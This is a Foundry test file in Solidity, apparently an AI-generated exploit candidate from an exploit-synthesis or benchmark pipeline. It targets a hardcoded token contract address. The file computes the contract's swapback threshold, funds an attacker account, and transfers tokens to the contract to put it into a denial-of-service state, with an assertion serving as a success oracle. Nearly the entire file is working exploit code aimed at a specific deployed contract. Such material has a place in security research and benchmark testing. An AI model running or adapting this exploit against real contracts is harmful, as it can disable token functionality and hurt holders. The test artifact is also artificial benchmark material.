// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Gemini.
// Reviewed candidate models: Gemini, Qwen, Deepseek.

import "forge-std/Test.sol";

interface StandardToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function _SWAPBACK_THRESHOLD(uint256 index) external view returns (uint256);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);
    StandardToken public token;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        token = StandardToken(TARGET);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {

        uint256 thresholdNumerator = token._SWAPBACK_THRESHOLD(0);
        uint256 thresholdDenominator = token._SWAPBACK_THRESHOLD(1);
        uint256 swapThreshold = (token.totalSupply() * thresholdNumerator) / thresholdDenominator;

        // The amount needed to trigger the vulnerability.
        // We send slightly more to be safe and pass the oracle.
        uint256 amountToTransfer = swapThreshold + 1;

        // Give the attacker the required tokens.
        deal(TARGET, attacker, amountToTransfer);

        // Transfer tokens to the contract to 'arm' the DoS.
        // This increases the contract's own token balance above the threshold.
        token.transfer(TARGET, amountToTransfer);

        // The oracle will now check that balanceOf(TARGET) is greater than the original threshold,
        // confirming the contract is in the DoS state.
        assertGt(token.balanceOf(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328), 12500000000000000000000, "Logic Exploit Failed");
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

